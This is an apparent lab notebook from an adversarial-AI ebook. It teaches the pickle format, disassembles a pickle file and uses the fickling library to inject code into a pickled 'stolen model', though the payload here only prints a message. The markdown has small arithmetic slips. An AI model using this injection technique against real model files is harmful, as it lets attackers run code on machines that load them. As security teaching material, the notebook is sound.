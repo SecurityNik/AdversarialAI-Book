{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "44c66dc8",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ad31b0f8",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(fickling.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08cb9df5",
   "metadata": {},
   "source": [
    "### Fickling Introduction  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "186a4f80",
   "metadata": {},
   "source": [
    "### Lab Objectives:   \n",
    "- Learn about pickle format   \n",
    "- Learn about pickeltools \n",
    "- Learn about fickling   \n",
    "- Learn how to modify a model pickle file   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb20ad71",
   "metadata": {},
   "source": [
    "### Step 1:  \n",
    "Laying the foundation   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "7c8b3af0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the needed libraries needed for this section\n",
    "import pickle\n",
    "import pickletools\n",
    "from fickling.fickle import Pickled"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a172e21d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Welcome to A Little Book on Adversarial AI\n",
      "Len of welcome: 42\n"
     ]
    }
   ],
   "source": [
    "# Let's understand the problem before taking advantage of it\n",
    "# Create a simple variable named welcome\n",
    "welcome = 'Welcome to A Little Book on Adversarial AI'\n",
    "print(welcome)\n",
    "print(f'Len of welcome: {len(welcome)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1a50a135",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/tmp/adversarial_ai_test.pkl'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Create a path for the file\n",
    "pickle_file = r'/tmp/adversarial_ai_test.pkl'\n",
    "pickle_file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "4ccd372a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/adversarial_ai_test.pkl\n",
      "cf8ee794c9f190277bb996a676ab4335  /tmp/adversarial_ai_test.pkl\n"
     ]
    }
   ],
   "source": [
    "# set up the file pointer to a file on the disk \n",
    "# We will **write** the binary information\n",
    "with open(file=pickle_file, mode='wb') as fp:\n",
    "    # Save the file to disk\n",
    "    # Use the highest version of pickle protocol\n",
    "    # Currently version 5 as of this writing\n",
    "    pickle.dump(obj=welcome, file=fp, protocol=pickle.HIGHEST_PROTOCOL)\n",
    "\n",
    "# Verify the file was created\n",
    "# Notice the \"!\" below, allows us to run external commands inside of \n",
    "# this notebook\n",
    "\n",
    "!ls {pickle_file}\n",
    "\n",
    "# Get the MD5 hash of the file we just created\n",
    "!md5sum {pickle_file}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f9a3670",
   "metadata": {},
   "source": [
    "### Step 2:   \n",
    "Disassembling the pickle file   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "cad2e512",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000: \u001b[1;31m80\u001b[0m\u001b[1;31m05\u001b[0m \u001b[1;31m95\u001b[0m\u001b[1;32m2e\u001b[0m \u001b[1;37m00\u001b[0m\u001b[1;37m00\u001b[0m \u001b[1;37m00\u001b[0m\u001b[1;37m00\u001b[0m \u001b[1;37m00\u001b[0m\u001b[1;37m00\u001b[0m \u001b[1;37m00\u001b[0m\u001b[1;31m8c\u001b[0m \u001b[1;32m2a\u001b[0m\u001b[1;32m57\u001b[0m \u001b[1;32m65\u001b[0m\u001b[1;32m6c\u001b[0m  \u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32m*\u001b[0m\u001b[1;32mW\u001b[0m\u001b[1;32me\u001b[0m\u001b[1;32ml\u001b[0m\n",
      "00000010: \u001b[1;32m63\u001b[0m\u001b[1;32m6f\u001b[0m \u001b[1;32m6d\u001b[0m\u001b[1;32m65\u001b[0m \u001b[1;32m20\u001b[0m\u001b[1;32m74\u001b[0m \u001b[1;32m6f\u001b[0m\u001b[1;32m20\u001b[0m \u001b[1;32m41\u001b[0m\u001b[1;32m20\u001b[0m \u001b[1;32m4c\u001b[0m\u001b[1;32m69\u001b[0m \u001b[1;32m74\u001b[0m\u001b[1;32m74\u001b[0m \u001b[1;32m6c\u001b[0m\u001b[1;32m65\u001b[0m  \u001b[1;32mc\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mm\u001b[0m\u001b[1;32me\u001b[0m\u001b[1;32m \u001b[0m\u001b[1;32mt\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32m \u001b[0m\u001b[1;32mA\u001b[0m\u001b[1;32m \u001b[0m\u001b[1;32mL\u001b[0m\u001b[1;32mi\u001b[0m\u001b[1;32mt\u001b[0m\u001b[1;32mt\u001b[0m\u001b[1;32ml\u001b[0m\u001b[1;32me\u001b[0m\n",
      "00000020: \u001b[1;32m20\u001b[0m\u001b[1;32m42\u001b[0m \u001b[1;32m6f\u001b[0m\u001b[1;32m6f\u001b[0m \u001b[1;32m6b\u001b[0m\u001b[1;32m20\u001b[0m \u001b[1;32m6f\u001b[0m\u001b[1;32m6e\u001b[0m \u001b[1;32m20\u001b[0m\u001b[1;32m41\u001b[0m \u001b[1;32m64\u001b[0m\u001b[1;32m76\u001b[0m \u001b[1;32m65\u001b[0m\u001b[1;32m72\u001b[0m \u001b[1;32m73\u001b[0m\u001b[1;32m61\u001b[0m  \u001b[1;32m \u001b[0m\u001b[1;32mB\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mk\u001b[0m\u001b[1;32m \u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mn\u001b[0m\u001b[1;32m \u001b[0m\u001b[1;32mA\u001b[0m\u001b[1;32md\u001b[0m\u001b[1;32mv\u001b[0m\u001b[1;32me\u001b[0m\u001b[1;32mr\u001b[0m\u001b[1;32ms\u001b[0m\u001b[1;32ma\u001b[0m\n",
      "00000030: \u001b[1;32m72\u001b[0m\u001b[1;32m69\u001b[0m \u001b[1;32m61\u001b[0m\u001b[1;32m6c\u001b[0m \u001b[1;32m20\u001b[0m\u001b[1;32m41\u001b[0m \u001b[1;32m49\u001b[0m\u001b[1;31m94\u001b[0m \u001b[1;32m2e\u001b[0m          \u001b[1;31m \u001b[0m\u001b[1;31m \u001b[0m\u001b[1;31m \u001b[0m\u001b[1;31m \u001b[0m\u001b[1;31m \u001b[0m\u001b[1;31m \u001b[0m\u001b[1;31m \u001b[0m  \u001b[1;32mr\u001b[0m\u001b[1;32mi\u001b[0m\u001b[1;32ma\u001b[0m\u001b[1;32ml\u001b[0m\u001b[1;32m \u001b[0m\u001b[1;32mA\u001b[0m\u001b[1;32mI\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32m.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "# If we look at the file on the disk, \n",
    "# using XXD (hexeditor) this is what we see\n",
    "!xxd {pickle_file}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "381fccba",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      5\n",
      "    2: \\x95 FRAME      46\n",
      "   11: \\x8c SHORT_BINUNICODE 'Welcome to A Little Book on Adversarial AI'\n",
      "   55: \\x94 MEMOIZE    (as 0)\n",
      "   56: .    STOP\n",
      "highest protocol among opcodes = 4\n"
     ]
    }
   ],
   "source": [
    "# Does not look like much above, let us disassemble it\n",
    "# This time open the file in **read** mode\n",
    "with open(file=pickle_file, mode='rb') as fp:\n",
    "    # retrieve the file from disk.\n",
    "    # Pickertools allows us to read pickle files, \n",
    "    # without executing any code\n",
    "    pickletools.dis(pickle=fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eacdd9bd",
   "metadata": {},
   "source": [
    "Using **pickletools** we were able to disassemble the pickle file we created earlier.  \n",
    "Immediately line 11, stands out as it represents the string we entered.   The *SHORT_BINUNICODE* is used to push a short unicode string that is less than 256 bytes unto the pickle stack  \n",
    "\n",
    "\n",
    "What are the other items though?\n",
    "\n",
    "- 0: \\x80 PROTO      5 -> Remember above we specified *.HIGHEST_PROTOCOL* and we stated that version is currently 5. This is the result of that.    \n",
    "- FRAME      46 -> Tells us that the size of our data is 46 bytes long. At this point len(welcome) is 42 bytes, so if you are wondering why 46 and not 42, it is because this 46 represents everything coming beyond this frame. Think of it as the full payload coming after the frame. \n",
    "Our SHORT_BINUNICODE: 1 byte   \n",
    "Prefix length: 1 byte   \n",
    "Our actual string: 42 bytes  \n",
    "MEMOIZE: 1 Byte   \n",
    ". STOP: 1 byte \n",
    "We add them all together and we get 1 + 1 + 42 + 1 + 1 = 42 bytes  \n",
    "\n",
    "54: \\x94 MEMOIZE    (as 0) -> Saves the object into the internal \"memo\" table   \n",
    "55: .    STOP -> This is the end of the pickle stream.  \n",
    "\n",
    "We are not here to perform disassembly but it is nice that we are able to interpret the output :-D "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9ff97db2",
   "metadata": {},
   "source": [
    "### Step 3:   \n",
    "Testing the stolen model   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "65f8186e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<fickling.fickle.Pickled at 0x7f4e32c4e7e0>"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let us assume we stole the model file\n",
    "with open(file=pickle_file, mode='rb') as fp:\n",
    "    # read the model into a variable\n",
    "    stolen_model = Pickled.load(pickled=fp)\n",
    "stolen_model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "5136a657",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now that we have the stolen_model file\n",
    "# Let us be the attacker.\n",
    "# Setup some *malicious* code\n",
    "\n",
    "# Let's now add this *malicious* code\n",
    "stolen_model.insert_python_exec('print(\"You have been PWNED!! BY SECURITYNIK Adversarial AI\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "fbaebb99",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/adversarial_ai_test_pwnd.pkl\n",
      "9bfcc24360bd654a7bdc8df79ca7c9a2  /tmp/adversarial_ai_test_pwnd.pkl\n"
     ]
    }
   ],
   "source": [
    "# Let's now put the model back on the file system\n",
    "# We will just use a separate file so we have something to compare\n",
    "# In the real world, we would overwrite the existing model \n",
    "with open(file=r'/tmp/adversarial_ai_test_pwnd.pkl', mode='wb') as fp:\n",
    "    # read the model into a variable\n",
    "    stolen_model.dump(file=fp)\n",
    "\n",
    "# We should see clearly below, the file has been modified\n",
    "# This can be recognized by the fact that the hash changed\n",
    "!ls /tmp/adversarial_ai_test_pwnd.pkl\n",
    "!md5sum /tmp/adversarial_ai_test_pwnd.pkl"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59f2bb8a",
   "metadata": {},
   "source": [
    "Write away if you compare the hashes of the two files, you should see a problem.    \n",
    "\n",
    "/tmp/adversarial_ai_test.pkl     \n",
    "cf8ee794c9f190277bb996a676ab4335    /tmp/adversarial_ai_test.pkl     \n",
    "\n",
    "/tmp/adversarial_ai_test_pwnd.pkl   \n",
    "9bfcc24360bd654a7bdc8df79ca7c9a2    /tmp/adversarial_ai_test_pwnd.pkl    \n",
    "\n",
    "The fact that the two hashes are different suggest the original file has been changed, thus impacting its integrity.   \n",
    "\n",
    "We know the file has changed but Can our malicious code be run also?   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "22f4fc9a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Welcome to A Little Book on Adversarial AI'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Open the file that we assume is legit\n",
    "# Notice the mode = 'rb'. \n",
    "# This means we are reading the file in binary format\n",
    "with open(file=pickle_file, mode='rb') as fp:\n",
    "    # read the model into a variable\n",
    "    trusted_model = pickle.load(file=fp)\n",
    "\n",
    "# When we look at the trusted_model or the results returned from the load, \n",
    "# we see ...\n",
    "trusted_model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bd7c4e8a",
   "metadata": {},
   "source": [
    "### Validate this with load_model.py\n",
    "You can also validate that this works outside of the notebook by running the load_model.py script.  \n",
    "\n",
    "Open a command prompt and go to the director where your **labs** are \n",
    "cd /path/to/labs    \n",
    "\n",
    "Once in there the script usage is:\n",
    "$ **python load_model.py --model /tmp/adversarial_ai_test.pkl**   \n",
    "\n",
    "Compare with the pwnd file,  \n",
    "$ **python load_model.py --model /tmp/adversarial_ai_test_pwnd.pkl**    \n",
    "\n",
    "\n",
    "\n",
    "### Step 4:   \n",
    "Building on the base knowledge   \n",
    "- Let us now target an simple scikit-learn model  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "821dc6ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import Iris dataset\n",
    "from sklearn.datasets import load_iris\n",
    "import numpy as np\n",
    "import pickle\n",
    "from fickling.fickle import Pickled"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5f01dd6f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This is the first 10 samples/rows from X: \n",
      "Consider these X1, X2 and X3\n",
      "\n",
      "[[6.3 2.3 4.4 1.3]\n",
      " [6.4 2.7 5.3 1.9]\n",
      " [5.4 3.7 1.5 0.2]\n",
      " [6.1 3.  4.6 1.4]\n",
      " [5.  3.3 1.4 0.2]\n",
      " [5.  2.  3.5 1. ]\n",
      " [6.3 2.5 4.9 1.5]\n",
      " [5.8 2.7 4.1 1. ]\n",
      " [5.1 3.4 1.5 0.2]\n",
      " [5.7 2.8 4.5 1.3]] \n",
      "\n",
      "This is the first 10 labels y matching with each row in X: \n",
      "[1. 2. 0. 1. 0. 1. 1. 1. 0. 1.] \n"
     ]
    }
   ],
   "source": [
    "# With this understanding, let's build a machine learning model, using the Iris dataset\n",
    "# The This models objective is to predict the flower type\n",
    "\n",
    "# Use sklearn's Iris toy dataset\n",
    "# Remember, we are not concerned about the data for the model\n",
    "# We are only concern with attacking the model   \n",
    "# This network will consist of 4 features. Each column represents a feature\n",
    "X, y = load_iris(return_X_y=True, as_frame=False)\n",
    "\n",
    "# Combine the X and y\n",
    "X_y = np.c_[X, y]\n",
    "\n",
    "# Shuffle the data\n",
    "np.random.seed(10)\n",
    "np.random.shuffle(X_y)\n",
    "\n",
    "# Split the data into X and y again\n",
    "X, y = X_y[:, :-1], X_y[:, -1]\n",
    "\n",
    "# Below we see a snapshot of X with 3 columns\n",
    "print(f'This is the first 10 samples/rows from X: \\nConsider these X1, X2 and X3\\n\\n{X[:10]} ')\n",
    "\n",
    "# Each X has an associated target/label/true value y. \n",
    "# The labels are 0 and 1, hence this is a binary classification problem\n",
    "print(f'\\nThis is the first 10 labels y matching with each row in X: \\n{y[:10]} ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "9239e61e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['setosa', 'versicolor', 'virginica'], dtype='<U10')"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Extract the target names also\n",
    "# These are the classes that the model needs to predict\n",
    "# Once again, not that important for the problem we are trying to solve\n",
    "iris_classes = load_iris()['target_names']\n",
    "iris_classes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "ba30a83a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the Random Forest Algorithm\n",
    "# Random Fores was a choice, nothing special about this choice\n",
    "# The objective is to show we can alter the models\n",
    "# No concerns about the algorithm\n",
    "\n",
    "from sklearn.ensemble import RandomForestClassifier"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "9597866d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style>#sk-container-id-1 {\n",
       "  /* Definition of color scheme common for light and dark mode */\n",
       "  --sklearn-color-text: #000;\n",
       "  --sklearn-color-text-muted: #666;\n",
       "  --sklearn-color-line: gray;\n",
       "  /* Definition of color scheme for unfitted estimators */\n",
       "  --sklearn-color-unfitted-level-0: #fff5e6;\n",
       "  --sklearn-color-unfitted-level-1: #f6e4d2;\n",
       "  --sklearn-color-unfitted-level-2: #ffe0b3;\n",
       "  --sklearn-color-unfitted-level-3: chocolate;\n",
       "  /* Definition of color scheme for fitted estimators */\n",
       "  --sklearn-color-fitted-level-0: #f0f8ff;\n",
       "  --sklearn-color-fitted-level-1: #d4ebff;\n",
       "  --sklearn-color-fitted-level-2: #b3dbfd;\n",
       "  --sklearn-color-fitted-level-3: cornflowerblue;\n",
       "\n",
       "  /* Specific color for light theme */\n",
       "  --sklearn-color-text-on-default-background: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, black)));\n",
       "  --sklearn-color-background: var(--sg-background-color, var(--theme-background, var(--jp-layout-color0, white)));\n",
       "  --sklearn-color-border-box: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, black)));\n",
       "  --sklearn-color-icon: #696969;\n",
       "\n",
       "  @media (prefers-color-scheme: dark) {\n",
       "    /* Redefinition of color scheme for dark theme */\n",
       "    --sklearn-color-text-on-default-background: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, white)));\n",
       "    --sklearn-color-background: var(--sg-background-color, var(--theme-background, var(--jp-layout-color0, #111)));\n",
       "    --sklearn-color-border-box: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, white)));\n",
       "    --sklearn-color-icon: #878787;\n",
       "  }\n",
       "}\n",
       "\n",
       "#sk-container-id-1 {\n",
       "  color: var(--sklearn-color-text);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 pre {\n",
       "  padding: 0;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 input.sk-hidden--visually {\n",
       "  border: 0;\n",
       "  clip: rect(1px 1px 1px 1px);\n",
       "  clip: rect(1px, 1px, 1px, 1px);\n",
       "  height: 1px;\n",
       "  margin: -1px;\n",
       "  overflow: hidden;\n",
       "  padding: 0;\n",
       "  position: absolute;\n",
       "  width: 1px;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-dashed-wrapped {\n",
       "  border: 1px dashed var(--sklearn-color-line);\n",
       "  margin: 0 0.4em 0.5em 0.4em;\n",
       "  box-sizing: border-box;\n",
       "  padding-bottom: 0.4em;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-container {\n",
       "  /* jupyter's `normalize.less` sets `[hidden] { display: none; }`\n",
       "     but bootstrap.min.css set `[hidden] { display: none !important; }`\n",
       "     so we also need the `!important` here to be able to override the\n",
       "     default hidden behavior on the sphinx rendered scikit-learn.org.\n",
       "     See: https://github.com/scikit-learn/scikit-learn/issues/21755 */\n",
       "  display: inline-block !important;\n",
       "  position: relative;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-text-repr-fallback {\n",
       "  display: none;\n",
       "}\n",
       "\n",
       "div.sk-parallel-item,\n",
       "div.sk-serial,\n",
       "div.sk-item {\n",
       "  /* draw centered vertical line to link estimators */\n",
       "  background-image: linear-gradient(var(--sklearn-color-text-on-default-background), var(--sklearn-color-text-on-default-background));\n",
       "  background-size: 2px 100%;\n",
       "  background-repeat: no-repeat;\n",
       "  background-position: center center;\n",
       "}\n",
       "\n",
       "/* Parallel-specific style estimator block */\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item::after {\n",
       "  content: \"\";\n",
       "  width: 100%;\n",
       "  border-bottom: 2px solid var(--sklearn-color-text-on-default-background);\n",
       "  flex-grow: 1;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel {\n",
       "  display: flex;\n",
       "  align-items: stretch;\n",
       "  justify-content: center;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  position: relative;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item {\n",
       "  display: flex;\n",
       "  flex-direction: column;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item:first-child::after {\n",
       "  align-self: flex-end;\n",
       "  width: 50%;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item:last-child::after {\n",
       "  align-self: flex-start;\n",
       "  width: 50%;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item:only-child::after {\n",
       "  width: 0;\n",
       "}\n",
       "\n",
       "/* Serial-specific style estimator block */\n",
       "\n",
       "#sk-container-id-1 div.sk-serial {\n",
       "  display: flex;\n",
       "  flex-direction: column;\n",
       "  align-items: center;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  padding-right: 1em;\n",
       "  padding-left: 1em;\n",
       "}\n",
       "\n",
       "\n",
       "/* Toggleable style: style used for estimator/Pipeline/ColumnTransformer box that is\n",
       "clickable and can be expanded/collapsed.\n",
       "- Pipeline and ColumnTransformer use this feature and define the default style\n",
       "- Estimators will overwrite some part of the style using the `sk-estimator` class\n",
       "*/\n",
       "\n",
       "/* Pipeline and ColumnTransformer style (default) */\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable {\n",
       "  /* Default theme specific background. It is overwritten whether we have a\n",
       "  specific estimator or a Pipeline/ColumnTransformer */\n",
       "  background-color: var(--sklearn-color-background);\n",
       "}\n",
       "\n",
       "/* Toggleable label */\n",
       "#sk-container-id-1 label.sk-toggleable__label {\n",
       "  cursor: pointer;\n",
       "  display: flex;\n",
       "  width: 100%;\n",
       "  margin-bottom: 0;\n",
       "  padding: 0.5em;\n",
       "  box-sizing: border-box;\n",
       "  text-align: center;\n",
       "  align-items: start;\n",
       "  justify-content: space-between;\n",
       "  gap: 0.5em;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 label.sk-toggleable__label .caption {\n",
       "  font-size: 0.6rem;\n",
       "  font-weight: lighter;\n",
       "  color: var(--sklearn-color-text-muted);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 label.sk-toggleable__label-arrow:before {\n",
       "  /* Arrow on the left of the label */\n",
       "  content: \"▸\";\n",
       "  float: left;\n",
       "  margin-right: 0.25em;\n",
       "  color: var(--sklearn-color-icon);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 label.sk-toggleable__label-arrow:hover:before {\n",
       "  color: var(--sklearn-color-text);\n",
       "}\n",
       "\n",
       "/* Toggleable content - dropdown */\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content {\n",
       "  display: none;\n",
       "  text-align: left;\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content.fitted {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content pre {\n",
       "  margin: 0.2em;\n",
       "  border-radius: 0.25em;\n",
       "  color: var(--sklearn-color-text);\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content.fitted pre {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 input.sk-toggleable__control:checked~div.sk-toggleable__content {\n",
       "  /* Expand drop-down */\n",
       "  display: block;\n",
       "  width: 100%;\n",
       "  overflow: visible;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 input.sk-toggleable__control:checked~label.sk-toggleable__label-arrow:before {\n",
       "  content: \"▾\";\n",
       "}\n",
       "\n",
       "/* Pipeline/ColumnTransformer-specific style */\n",
       "\n",
       "#sk-container-id-1 div.sk-label input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  color: var(--sklearn-color-text);\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-label.fitted input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "/* Estimator-specific style */\n",
       "\n",
       "/* Colorize estimator box */\n",
       "#sk-container-id-1 div.sk-estimator input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-estimator.fitted input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-label label.sk-toggleable__label,\n",
       "#sk-container-id-1 div.sk-label label {\n",
       "  /* The background is the default theme color */\n",
       "  color: var(--sklearn-color-text-on-default-background);\n",
       "}\n",
       "\n",
       "/* On hover, darken the color of the background */\n",
       "#sk-container-id-1 div.sk-label:hover label.sk-toggleable__label {\n",
       "  color: var(--sklearn-color-text);\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "/* Label box, darken color on hover, fitted */\n",
       "#sk-container-id-1 div.sk-label.fitted:hover label.sk-toggleable__label.fitted {\n",
       "  color: var(--sklearn-color-text);\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "/* Estimator label */\n",
       "\n",
       "#sk-container-id-1 div.sk-label label {\n",
       "  font-family: monospace;\n",
       "  font-weight: bold;\n",
       "  display: inline-block;\n",
       "  line-height: 1.2em;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-label-container {\n",
       "  text-align: center;\n",
       "}\n",
       "\n",
       "/* Estimator-specific */\n",
       "#sk-container-id-1 div.sk-estimator {\n",
       "  font-family: monospace;\n",
       "  border: 1px dotted var(--sklearn-color-border-box);\n",
       "  border-radius: 0.25em;\n",
       "  box-sizing: border-box;\n",
       "  margin-bottom: 0.5em;\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-estimator.fitted {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-0);\n",
       "}\n",
       "\n",
       "/* on hover */\n",
       "#sk-container-id-1 div.sk-estimator:hover {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-estimator.fitted:hover {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "/* Specification for estimator info (e.g. \"i\" and \"?\") */\n",
       "\n",
       "/* Common style for \"i\" and \"?\" */\n",
       "\n",
       ".sk-estimator-doc-link,\n",
       "a:link.sk-estimator-doc-link,\n",
       "a:visited.sk-estimator-doc-link {\n",
       "  float: right;\n",
       "  font-size: smaller;\n",
       "  line-height: 1em;\n",
       "  font-family: monospace;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  border-radius: 1em;\n",
       "  height: 1em;\n",
       "  width: 1em;\n",
       "  text-decoration: none !important;\n",
       "  margin-left: 0.5em;\n",
       "  text-align: center;\n",
       "  /* unfitted */\n",
       "  border: var(--sklearn-color-unfitted-level-1) 1pt solid;\n",
       "  color: var(--sklearn-color-unfitted-level-1);\n",
       "}\n",
       "\n",
       ".sk-estimator-doc-link.fitted,\n",
       "a:link.sk-estimator-doc-link.fitted,\n",
       "a:visited.sk-estimator-doc-link.fitted {\n",
       "  /* fitted */\n",
       "  border: var(--sklearn-color-fitted-level-1) 1pt solid;\n",
       "  color: var(--sklearn-color-fitted-level-1);\n",
       "}\n",
       "\n",
       "/* On hover */\n",
       "div.sk-estimator:hover .sk-estimator-doc-link:hover,\n",
       ".sk-estimator-doc-link:hover,\n",
       "div.sk-label-container:hover .sk-estimator-doc-link:hover,\n",
       ".sk-estimator-doc-link:hover {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-3);\n",
